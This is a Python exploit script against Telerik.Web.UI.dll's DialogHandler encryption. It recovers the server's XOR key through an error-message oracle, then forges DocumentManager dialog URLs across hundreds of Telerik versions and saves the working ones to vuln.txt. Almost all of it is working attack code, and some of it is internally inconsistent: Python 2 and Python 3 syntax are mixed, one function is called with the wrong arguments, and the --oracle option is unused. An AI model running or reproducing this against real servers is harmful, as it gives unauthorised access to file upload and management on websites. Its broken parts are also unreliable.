#python3
# Telerik.Web.UI.dll Cryptographic compromise
# Warning - no cert warnings,
# and verify = False in code below prevents verification

import sys
import base64
import requests
import re
import binascii
import argparse
import time
import numpy as np

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

requests_sent = 0
char_requests = 0
base64chars = [
                    "A", "Q", "g", "w", "B", "R", "h", "x", "C", "S", "i", "y",
                    "D", "T", "j", "z", "E", "U", "k", "0", "F", "V", "l", "1",
                    "G", "W", "m", "2", "H", "X", "n", "3", "I", "Y", "o", "4",
                    "J", "Z", "p", "5", "K", "a", "q", "6", "L", "b", "r", "7",
                    "M", "c", "s", "8", "N", "d", "t", "9", "O", "e", "u", "+",
                    "P", "f", "v", "/"
                  ]

match_table = {}
key_charset = []
strip_chars =[" ","\n","\t","=","\r"]
MatchString='non-base 64 character'
def getProxy(proxy):
    return { "http" : proxy, "https" : proxy }
def init_table():
    global match_table, key_charset
    for c in base64chars:
        t_arr = []
        for x in key_charset:
            tmp_check = ord(c) ^ ord(x)
            if tmp_check >= 128:
                continue
            if ( tmp_check < 128 and chr(tmp_check) in strip_chars):
                continue
            if (chr(tmp_check) not in base64chars):
                t_arr.append(x)
        match_table[c] = t_arr

        #print c,':', match_table[c]


def get_result( found, session):
    global requests_sent, char_requests, match_table, key_charset

    url = args.url
    #base_pad = (len(key) % 4)
    #base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]
    pt = ''
    char_requests = 0
    for i in range(len(found)):
        pt = pt + chr(ord('a')^ ord(found[i]))

    list_avail = key_charset
    start = 0
    while len(list_avail) > 1 and start < len(base64chars):
        char_test = base64chars[start]
        test_pt = (pt + char_test).encode('base64')
        start += 1
        #print test_pt
        request = requests.Request('GET', url + '?dp=' + test_pt )
        request = request.prepare()
        response = session.send(request, verify=False, proxies = getProxy(args.proxy))
        requests_sent += 1
        char_requests += 1
        if (response.text.find(MatchString) > 0):
            tmp_list_avail = []
            for cc in list_avail:
                if (cc in match_table[char_test]):
                    tmp_list_avail.append(cc)
            list_avail = tmp_list_avail

            #if (len(found) >= 6):
            #    print list_avail, len(list_avail)

    if (len(list_avail) != 1):
        return 'Not found'
    else:
        return list_avail[0]


def test_keychar(keychar, found, session):

    duff = False
    accuracy_thoroughness_threshold = args.accuracy
    for bc in range(int(accuracy_thoroughness_threshold)):
                                                # ^^ max is len(base64chars)
        sys.stdout.write("\b\b" + base64chars[bc] + "]")
        sys.stdout.flush()
        if not get_result(
                      base64chars[0] * len(found) + base64chars[bc],
                      found + keychar, session,
                      ):
            duff = True
            break
    return False if duff else True


def encrypt(dpdata, key):
    encrypted = []
    k = 0
    for i in range(len(dpdata)):
        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))
        k = 0 if k >= len(key) - 1 else k + 1
    return ''.join(str(e) for e in encrypted)


def mode_decrypt():
    ciphertext = base64.b64decode(args.ciphertext).decode()
    key = args.key
    print(base64.b64decode(encrypt(ciphertext, key)).decode())
    print("")


def mode_encrypt():
    plaintext = args.plaintext
    key = args.key

    plaintext = base64.b64encode(plaintext.encode()).decode()
    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())
    print("")




def get_key(session):
    global char_requests, key_charset
    found = ''
    unprintable = False

    key_length = args.key_len
    key_charset = args.charset
    if key_charset == 'all':
        unprintable = True
        key_charset = ''
        for i in range(256):
            key_charset += chr(i)
    else:
        if key_charset == 'hex':
            key_charset = '0123456789ABCDEF'

    print("Attacking " + args.url)
    print(
        "to find key of length [" +
        str(key_length) +
        "] with accuracy threshold [" +
        str(args.accuracy) +
        "]"
    )
    print(
        "using key charset [" +
        (
            key_charset
            if unprintable is False
            else '- all ASCII -'
        ) +
        "]\n"
    )
    init_table()
    for i in range(int(key_length)):
        pos_str = (
            str(i + 1)
            if i > 8
            else "0" + str(i + 1)
        )
        print("Key position " + pos_str)

        #keychar = test_keypos(key_charset, unprintable, found, session)
        keychar = get_result( found, session)


        if len(keychar) > 1:
            print 'X Not Found, quit!'
            break
        else:
            found = found + keychar
            print '[+]Found key: ',
            sys.stdout.write(
                 "{" +
                    (
                      keychar
                      if unprintable is False
                      else '0x' + binascii.hexlify(keychar.encode()).decode()
                    ) +
                     "} found with " +
                      str(char_requests) +
                     " requests, total so far: " +
                     str(requests_sent) +
                     "\n"
                )




    print("Total web requests: " + str(requests_sent))
    print ("Key found: "+found)
    return found


def mode_brutekey():
    session = requests.Session()
    found = get_key(session)

    if found == '':
        return
    else:
        urls = {}
        url_path = args.url
        params = (
                    '?DialogName=DocumentManager' +
                    '&renderMode=2' +
                    '&Skin=Default' +
                    '&Title=Document%20Manager' +
                    '&dpptn=' +
                    '&isRtl=false' +
                    '&dp='
                  )
        versions = ['2011.1.315.35', '2009.2.826.20' ,
                    '2007.1423', '2007.1521', '2007.1626', '2007.2918',
                    '2007.21010', '2007.21107', '2007.31218', '2007.31314',
                    '2007.31425', '2008.1415', '2008.1515', '2008.1619',
                    '2008.2723', '2008.2826', '2008.21001', '2008.31105',
                    '2008.31125', '2008.31314', '2009.1311', '2009.1402',
                    '2009.1527', '2009.2701', '2009.2826', '2009.31103',
                    '2009.31208', '2009.31314', '2010.1309', '2010.1415',
                    '2010.1519', '2010.2713', '2010.2826', '2010.2929',
                    '2010.31109', '2010.31215', '2010.31317', '2011.1315',
                    '2011.1413', '2011.1519', '2011.2712', '2011.2915',
                    '2011.31115','2011.1.314.35', '2011.3.1305', '2012.1.215', '2012.1.411',
                    '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',
                    '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',
                    '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',
                    '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',
                    '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204',
                    '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623',
                    '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111',
                    '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607',
                    '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',
                    '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',
                    '2017.3.913', '2011.1.315.40', '2013.2.171.40', '2013.3.1015.40',
                    '2015.1.401.40', '2013.2.611.45', '2015.1.225.45', '2008.3.1125.20',
                    '2019.2.514.45', '2009.3.1103.35', '2013.1.417.45', '2012.2.815.40'
                    '2013.1.417.35', '2013.1.417.40' ,'2007.1423.5', '2007.1423.10',
                    '2007.1423.15', '2007.1423.20', '2007.1423.25',
                    '2007.1423.30', '2007.1423.35', '2007.1423.40', '2007.1423.45', '2007.1521.5',
                    '2007.1521.10', '2007.1521.15', '2007.1521.20', '2007.1521.25', '2007.1521.30',
                    '2007.1521.35', '2007.1521.40', '2007.1521.45', '2007.1626.5', '2007.1626.10',
                    '2007.1626.15', '2007.1626.20', '2007.1626.25', '2007.1626.30', '2007.1626.35',
                    '2007.1626.40', '2007.1626.45', '2007.2918.5', '2007.2918.10', '2007.2918.15',
                    '2007.2918.20', '2007.2918.25', '2007.2918.30', '2007.2918.35', '2007.2918.40',
                    '2007.2918.45', '2007.21010.5', '2007.21010.10', '2007.21010.15', '2007.21010.20',
                    '2007.21010.25', '2007.21010.30', '2007.21010.35', '2007.21010.40', '2007.21010.45',
                    '2007.21107.5', '2007.21107.10', '2007.21107.15', '2007.21107.20', '2007.21107.25',
                    '2007.21107.30', '2007.21107.35', '2007.21107.40', '2007.21107.45', '2007.31218.5',
                    '2007.31218.10', '2007.31218.15', '2007.31218.20', '2007.31218.25', '2007.31218.30',
                    '2007.31218.35', '2007.31218.40', '2007.31218.45', '2007.31314.5', '2007.31314.10',
                    '2007.31314.15', '2007.31314.20', '2007.31314.25', '2007.31314.30', '2007.31314.35',
                    '2007.31314.40', '2007.31314.45', '2007.31425.5', '2007.31425.10', '2007.31425.15',
                    '2007.31425.20', '2007.31425.25', '2007.31425.30', '2007.31425.35', '2007.31425.40',
                    '2007.31425.45', '2008.1415.5', '2008.1415.10', '2008.1415.15', '2008.1415.20',
                    '2008.1415.25', '2008.1415.30', '2008.1415.35', '2008.1415.40', '2008.1415.45',
                    '2008.1515.5', '2008.1515.10', '2008.1515.15', '2008.1515.20', '2008.1515.25',
                    '2008.1515.30', '2008.1515.35', '2008.1515.40', '2008.1515.45', '2008.1619.5',
                    '2008.1619.10', '2008.1619.15', '2008.1619.20', '2008.1619.25', '2008.1619.30',
                    '2008.1619.35', '2008.1619.40', '2008.1619.45', '2008.2723.5', '2008.2723.10',
                    '2008.2723.15', '2008.2723.20', '2008.2723.25', '2008.2723.30', '2008.2723.35',
                    '2008.2723.40', '2008.2723.45', '2008.2826.5', '2008.2826.10', '2008.2826.15',
                    '2008.2826.20', '2008.2826.25', '2008.2826.30', '2008.2826.35', '2008.2826.40',
                    '2008.2826.45', '2008.21001.5', '2008.21001.10', '2008.21001.15', '2008.21001.20',
                    '2008.21001.25', '2008.21001.30', '2008.21001.35', '2008.21001.40', '2008.21001.45',
                    '2008.31105.5', '2008.31105.10', '2008.31105.15', '2008.31105.20', '2008.31105.25',
                    '2008.31105.30', '2008.31105.35', '2008.31105.40', '2008.31105.45', '2008.31125.5',
                    '2008.31125.10', '2008.31125.15', '2008.31125.20', '2008.31125.25', '2008.31125.30',
                    '2008.31125.35', '2008.31125.40', '2008.31125.45', '2008.31314.5', '2008.31314.10',
                    '2008.31314.15', '2008.31314.20', '2008.31314.25', '2008.31314.30', '2008.31314.35',
                    '2008.31314.40', '2008.31314.45', '2009.1311.5', '2009.1311.10', '2009.1311.15',
                    '2009.1311.20', '2009.1311.25', '2009.1311.30', '2009.1311.35', '2009.1311.40',
                    '2009.1311.45', '2009.1402.5', '2009.1402.10', '2009.1402.15', '2009.1402.20',
                    '2009.1402.25', '2009.1402.30', '2009.1402.35', '2009.1402.40', '2009.1402.45',
                    '2009.1527.5', '2009.1527.10', '2009.1527.15', '2009.1527.20', '2009.1527.25',
                    '2009.1527.30', '2009.1527.35', '2009.1527.40', '2009.1527.45', '2009.2701.5',
                    '2009.2701.10', '2009.2701.15', '2009.2701.20', '2009.2701.25', '2009.2701.30',
                    '2009.2701.35', '2009.2701.40', '2009.2701.45', '2009.2826.5', '2009.2826.10',
                    '2009.2826.15', '2009.2826.20', '2009.2826.25', '2009.2826.30', '2009.2826.35',
                    '2009.2826.40', '2009.2826.45', '2009.31103.5', '2009.31103.10', '2009.31103.15',
                    '2009.31103.20', '2009.31103.25', '2009.31103.30', '2009.31103.35', '2009.31103.40',
                    '2009.31103.45', '2009.31208.5', '2009.31208.10', '2009.31208.15', '2009.31208.20',
                    '2009.31208.25', '2009.31208.30', '2009.31208.35', '2009.31208.40', '2009.31208.45',
                    '2009.31314.5', '2009.31314.10', '2009.31314.15', '2009.31314.20', '2009.31314.25',
                    '2009.31314.30', '2009.31314.35', '2009.31314.40', '2009.31314.45', '2010.1309.5',
                    '2010.1309.10', '2010.1309.15', '2010.1309.20', '2010.1309.25', '2010.1309.30',
                    '2010.1309.35', '2010.1309.40', '2010.1309.45', '2010.1415.5', '2010.1415.10',
                    '2010.1415.15', '2010.1415.20', '2010.1415.25', '2010.1415.30', '2010.1415.35',
                    '2010.1415.40', '2010.1415.45', '2010.1519.5', '2010.1519.10', '2010.1519.15',
                    '2010.1519.20', '2010.1519.25', '2010.1519.30', '2010.1519.35', '2010.1519.40',
                    '2010.1519.45', '2010.2713.5', '2010.2713.10', '2010.2713.15', '2010.2713.20',
                    '2010.2713.25', '2010.2713.30', '2010.2713.35', '2010.2713.40', '2010.2713.45',
                    '2010.2826.5', '2010.2826.10', '2010.2826.15', '2010.2826.20', '2010.2826.25',
                    '2010.2826.30', '2010.2826.35', '2010.2826.40', '2010.2826.45', '2010.2929.5',
                    '2010.2929.10', '2010.2929.15', '2010.2929.20', '2010.2929.25', '2010.2929.30',
                    '2010.2929.35', '2010.2929.40', '2010.2929.45', '2010.31109.5', '2010.31109.10',
                    '2010.31109.15', '2010.31109.20', '2010.31109.25', '2010.31109.30', '2010.31109.35',
                    '2010.31109.40', '2010.31109.45', '2010.31215.5', '2010.31215.10', '2010.31215.15',
                    '2010.31215.20', '2010.31215.25', '2010.31215.30', '2010.31215.35', '2010.31215.40',
                    '2010.31215.45', '2010.31317.5', '2010.31317.10', '2010.31317.15', '2010.31317.20',
                    '2010.31317.25', '2010.31317.30', '2010.31317.35', '2010.31317.40', '2010.31317.45',
                    '2011.1315.5', '2011.1315.10', '2011.1315.15', '2011.1315.20', '2011.1315.25', '2011.1315.30',
                    '2011.1315.35', '2011.1315.40', '2011.1315.45', '2011.1413.5', '2011.1413.10', '2011.1413.15',
                    '2011.1413.20', '2011.1413.25', '2011.1413.30', '2011.1413.35', '2011.1413.40', '2011.1413.45',
                    '2011.1519.5', '2011.1519.10', '2011.1519.15', '2011.1519.20', '2011.1519.25', '2011.1519.30',
                    '2011.1519.35', '2011.1519.40', '2011.1519.45', '2011.2712.5', '2011.2712.10', '2011.2712.15',
                    '2011.2712.20', '2011.2712.25', '2011.2712.30', '2011.2712.35', '2011.2712.40', '2011.2712.45',
                    '2011.2915.5', '2011.2915.10', '2011.2915.15', '2011.2915.20', '2011.2915.25', '2011.2915.30',
                    '2011.2915.35', '2011.2915.40', '2011.2915.45', '2011.31115.5', '2011.31115.10', '2011.31115.15',
                    '2011.31115.20', '2011.31115.25', '2011.31115.30', '2011.31115.35', '2011.31115.40', '2011.31115.45',
                    '2011.3.1305.5', '2011.3.1305.10', '2011.3.1305.15', '2011.3.1305.20', '2011.3.1305.25', '2011.3.1305.30',
                    '2011.3.1305.35', '2011.3.1305.40', '2011.3.1305.45', '2012.1.215.5', '2012.1.215.10', '2012.1.215.15',
                    '2012.1.215.20', '2012.1.215.25', '2012.1.215.30', '2012.1.215.35', '2012.1.215.40', '2012.1.215.45',
                    '2012.1.411.5', '2012.1.411.10', '2012.1.411.15', '2012.1.411.20', '2012.1.411.25', '2012.1.411.30',
                    '2012.1.411.35', '2012.1.411.40', '2012.1.411.45', '2012.2.607.5', '2012.2.607.10', '2012.2.607.15',
                    '2012.2.607.20', '2012.2.607.25', '2012.2.607.30', '2012.2.607.35', '2012.2.607.40', '2012.2.607.45',
                    '2012.2.724.5', '2012.2.724.10', '2012.2.724.15', '2012.2.724.20', '2012.2.724.25', '2012.2.724.30',
                    '2012.2.724.35', '2012.2.724.40', '2012.2.724.45', '2012.2.912.5', '2012.2.912.10', '2012.2.912.15',
                    '2012.2.912.20', '2012.2.912.25', '2012.2.912.30', '2012.2.912.35', '2012.2.912.40', '2012.2.912.45',
                    '2012.3.1016.5', '2012.3.1016.10', '2012.3.1016.15', '2012.3.1016.20', '2012.3.1016.25', '2012.3.1016.30',
                    '2012.3.1016.35', '2012.3.1016.40', '2012.3.1016.45', '2012.3.1205.5', '2012.3.1205.10', '2012.3.1205.15',
                    '2012.3.1205.20', '2012.3.1205.25', '2012.3.1205.30', '2012.3.1205.35', '2012.3.1205.40', '2012.3.1205.45',
                    '2012.3.1308.5', '2012.3.1308.10', '2012.3.1308.15', '2012.3.1308.20', '2012.3.1308.25', '2012.3.1308.30',
                    '2012.3.1308.35', '2012.3.1308.40', '2012.3.1308.45', '2013.1.220.5', '2013.1.220.10', '2013.1.220.15',
                    '2013.1.220.20', '2013.1.220.25', '2013.1.220.30', '2013.1.220.35', '2013.1.220.40', '2013.1.220.45',
                    '2013.1.403.5', '2013.1.403.10', '2013.1.403.15', '2013.1.403.20', '2013.1.403.25', '2013.1.403.30',
                    '2013.1.403.35', '2013.1.403.40', '2013.1.403.45', '2013.1.417.5', '2013.1.417.10', '2013.1.417.15',
                    '2013.1.417.20', '2013.1.417.25', '2013.1.417.30', '2013.1.417.35', '2013.1.417.40', '2013.1.417.45',
                    '2013.2.611.5', '2013.2.611.10', '2013.2.611.15', '2013.2.611.20', '2013.2.611.25', '2013.2.611.30',
                    '2013.2.611.35', '2013.2.611.40', '2013.2.611.45', '2013.2.717.5', '2013.2.717.10', '2013.2.717.15',
                    '2013.2.717.20', '2013.2.717.25', '2013.2.717.30', '2013.2.717.35', '2013.2.717.40', '2013.2.717.45',
                    '2013.3.1015.5', '2013.3.1015.10', '2013.3.1015.15', '2013.3.1015.20', '2013.3.1015.25', '2013.3.1015.30',
                    '2013.3.1015.35', '2013.3.1015.40', '2013.3.1015.45', '2013.3.1114.5', '2013.3.1114.10', '2013.3.1114.15',
                    '2013.3.1114.20', '2013.3.1114.25', '2013.3.1114.30', '2013.3.1114.35', '2013.3.1114.40', '2013.3.1114.45',
                    '2013.3.1324.5', '2013.3.1324.10', '2013.3.1324.15', '2013.3.1324.20', '2013.3.1324.25', '2013.3.1324.30',
                    '2013.3.1324.35', '2013.3.1324.40', '2013.3.1324.45', '2014.1.225.5', '2014.1.225.10', '2014.1.225.15',
                    '2014.1.225.20', '2014.1.225.25', '2014.1.225.30', '2014.1.225.35', '2014.1.225.40', '2014.1.225.45',
                    '2014.1.403.5', '2014.1.403.10', '2014.1.403.15', '2014.1.403.20', '2014.1.403.25', '2014.1.403.30',
                    '2014.1.403.35', '2014.1.403.40', '2014.1.403.45', '2014.2.618.5', '2014.2.618.10', '2014.2.618.15',
                    '2014.2.618.20', '2014.2.618.25', '2014.2.618.30', '2014.2.618.35', '2014.2.618.40', '2014.2.618.45',
                    '2014.2.724.5', '2014.2.724.10', '2014.2.724.15', '2014.2.724.20', '2014.2.724.25', '2014.2.724.30',
                    '2014.2.724.35', '2014.2.724.40', '2014.2.724.45', '2014.3.1024.5', '2014.3.1024.10', '2014.3.1024.15',
                    '2014.3.1024.20', '2014.3.1024.25', '2014.3.1024.30', '2014.3.1024.35', '2014.3.1024.40', '2014.3.1024.45',
                    '2015.1.204.5', '2015.1.204.10', '2015.1.204.15', '2015.1.204.20', '2015.1.204.25', '2015.1.204.30', '2015.1.204.35',
                    '2015.1.204.40', '2015.1.204.45', '2015.1.225.5', '2015.1.225.10', '2015.1.225.15', '2015.1.225.20',
                    '2015.1.225.25', '2015.1.225.30', '2015.1.225.35', '2015.1.225.40', '2015.1.225.45', '2015.1.401.5',
                    '2015.1.401.10', '2015.1.401.15', '2015.1.401.20', '2015.1.401.25', '2015.1.401.30', '2015.1.401.35',
                    '2015.1.401.40', '2015.1.401.45', '2015.2.604.5', '2015.2.604.10', '2015.2.604.15', '2015.2.604.20',
                    '2015.2.604.25', '2015.2.604.30', '2015.2.604.35', '2015.2.604.40', '2015.2.604.45', '2015.2.623.5',
                    '2015.2.623.10', '2015.2.623.15', '2015.2.623.20', '2015.2.623.25', '2015.2.623.30', '2015.2.623.35',
                    '2015.2.623.40', '2015.2.623.45', '2015.2.729.5', '2015.2.729.10', '2015.2.729.15', '2015.2.729.20',
                    '2015.2.729.25', '2015.2.729.30', '2015.2.729.35', '2015.2.729.40', '2015.2.729.45', '2015.2.826.5',
                    '2015.2.826.10', '2015.2.826.15', '2015.2.826.20', '2015.2.826.25', '2015.2.826.30', '2015.2.826.35',
                    '2015.2.826.40', '2015.2.826.45', '2015.3.930.5', '2015.3.930.10', '2015.3.930.15', '2015.3.930.20',
                    '2015.3.930.25', '2015.3.930.30', '2015.3.930.35', '2015.3.930.40', '2015.3.930.45', '2015.3.1111.5',
                    '2015.3.1111.10', '2015.3.1111.15', '2015.3.1111.20', '2015.3.1111.25', '2015.3.1111.30', '2015.3.1111.35',
                    '2015.3.1111.40', '2015.3.1111.45', '2016.1.113.5', '2016.1.113.10', '2016.1.113.15', '2016.1.113.20',
                    '2016.1.113.25', '2016.1.113.30', '2016.1.113.35', '2016.1.113.40', '2016.1.113.45', '2016.1.225.5',
                    '2016.1.225.10', '2016.1.225.15', '2016.1.225.20', '2016.1.225.25', '2016.1.225.30', '2016.1.225.35',
                    '2016.1.225.40', '2016.1.225.45', '2016.2.504.5', '2016.2.504.10', '2016.2.504.15', '2016.2.504.20',
                    '2016.2.504.25', '2016.2.504.30', '2016.2.504.35', '2016.2.504.40', '2016.2.504.45', '2016.2.607.5',
                    '2016.2.607.10', '2016.2.607.15', '2016.2.607.20', '2016.2.607.25', '2016.2.607.30', '2016.2.607.35',
                    '2016.2.607.40', '2016.2.607.45', '2016.3.914.5', '2016.3.914.10', '2016.3.914.15', '2016.3.914.20',
                    '2016.3.914.25', '2016.3.914.30', '2016.3.914.35', '2016.3.914.40', '2016.3.914.45', '2016.3.1018.5',
                    '2016.3.1018.10', '2016.3.1018.15', '2016.3.1018.20', '2016.3.1018.25', '2016.3.1018.30', '2016.3.1018.35',
                    '2016.3.1018.40', '2016.3.1018.45', '2016.3.1027.5', '2016.3.1027.10', '2016.3.1027.15', '2016.3.1027.20',
                    '2016.3.1027.25', '2016.3.1027.30', '2016.3.1027.35', '2016.3.1027.40', '2016.3.1027.45', '2017.1.118.5',
                    '2017.1.118.10', '2017.1.118.15', '2017.1.118.20', '2017.1.118.25', '2017.1.118.30', '2017.1.118.35',
                    '2017.1.118.40', '2017.1.118.45', '2017.1.228.5', '2017.1.228.10', '2017.1.228.15', '2017.1.228.20',
                    '2017.1.228.25', '2017.1.228.30', '2017.1.228.35', '2017.1.228.40', '2017.1.228.45', '2017.2.503.5',
                    '2017.2.503.10', '2017.2.503.15', '2017.2.503.20', '2017.2.503.25', '2017.2.503.30', '2017.2.503.35',
                    '2017.2.503.40', '2017.2.503.45', '2017.2.621.5', '2017.2.621.10', '2017.2.621.15', '2017.2.621.20',
                    '2017.2.621.25', '2017.2.621.30', '2017.2.621.35', '2017.2.621.40', '2017.2.621.45', '2017.2.711.5',
                    '2017.2.711.10', '2017.2.711.15', '2017.2.711.20', '2017.2.711.25', '2017.2.711.30', '2017.2.711.35',
                    '2017.2.711.40', '2017.2.711.45', '2017.3.913.5', '2017.3.913.10', '2017.3.913.15', '2017.3.913.20',
                    '2017.3.913.25', '2017.3.913.30', '2017.3.913.35', '2017.3.913.40', '2017.3.913.45'
                    ]
        plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'
        plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='
        plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
        plaintext3 = ';AllowMultipleSelection,False,3,False'

        if len(args.version) > 0:
            versions = [args.version]

        for version in versions:
            plaintext2_raw2 = version
            plaintext2 = base64.b64encode(
                            (plaintext2_raw1 +
                                plaintext2_raw2 +
                                plaintext2_raw3
                             ).encode()
                        ).decode()
            plaintext = plaintext1 + plaintext2 + plaintext3
            plaintext = base64.b64encode(
                            plaintext.encode()
                        ).decode()
            ciphertext = base64.b64encode(
                            encrypt(
                                plaintext,
                                found
                            ).encode()
                        ).decode()
            full_url = url_path + params + ciphertext
            urls[version] = full_url

        found_valid_version = False
        for version in urls:
            url = urls[version]
            request = requests.Request('GET', url)
            request = request.prepare()
            response = session.send(request, verify=False, proxies=getProxy(args.proxy))
            if response.status_code == 500:
                continue
            else:
                match = re.search(
                    "(Error Message:)(.+\n*.+)(</div>)",
                    response.text
                    )
                if "##LOC[OK]##" in response.text:
                    print(version + ": " + url)
                    time.sleep(1)
                    save = open("vuln.txt","a")
                    found_valid_version = True
                    save.write(url+"\n")
                    save.close()
                    break

        if not found_valid_version:
            print("No valid version found")
            save = open("404.txt","a")
            save.write(url+"\n")
            save.close()

def mode_samples():
    print("Samples for testing decryption and encryption functions:")
    print("-d ciphertext key")
    print("-e plaintext key")
    print("")
    print("Key:")
    print("DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D")
    print("")
    print("Plaintext:")
    print("EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False")
    print("")
    print("Ciphertext:")
    print("FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+")
    print("")


def mode_b64e():
    print(base64.b64encode(args.parameter.encode()).decode())
    print("")


def mode_b64d():
    print(base64.b64decode(args.parameter.encode()).decode())
    print("")

sys.stderr.write(
              "Telerik.Web.UI.dll Exploit Bypass Redirect\n\n"
            )

p = argparse.ArgumentParser()
subparsers = p.add_subparsers()

decrypt_parser = subparsers.add_parser('d', help='Decrypt a ciphertext')
decrypt_parser.set_defaults(func=mode_decrypt)
decrypt_parser.add_argument('ciphertext', action='store', type=str, default='', help='Ciphertext to decrypt')
decrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

encrypt_parser = subparsers.add_parser('e', help='Encrypt a plaintext')
encrypt_parser.set_defaults(func=mode_encrypt)
encrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Ciphertext to decrypt')
encrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
brute_parser.set_defaults(func=mode_brutekey)
brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL')
brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')
brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined. OPTIONAL: default is hex')
brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')
brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')

encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
encode_parser.set_defaults(func=mode_b64e)
